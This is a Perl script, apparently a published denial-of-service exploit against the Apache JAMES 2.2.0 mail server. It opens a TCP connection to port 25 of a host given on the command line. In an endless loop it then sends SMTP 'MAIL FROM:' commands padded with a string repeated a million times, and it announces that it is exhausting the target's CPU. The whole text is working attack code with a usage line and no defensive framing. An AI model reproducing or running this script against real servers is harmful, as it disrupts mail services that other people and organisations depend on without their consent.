#!/usr/bin/perl -w

use IO::Socket;

print "* DOS buat JAMES ver.2.2.0 by y3dips *\n";

if(@ARGV == 1)

{

      my $host = $ARGV[0];
      my $i = 1;

$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$host, PeerPort=>"25", Reuse=>1)
or die " Cannot Connect to Server !";

while ( $i++ ) {
print $socket "MAIL FROM:" . "fvclz" x 1000000 . "\r\n" and
print " -- sucking CPU resources at $host .....\n";
sleep(1);
}
  close $socket;

}
else
 {  print " Usage: $0 [target] \r\n\n";  }

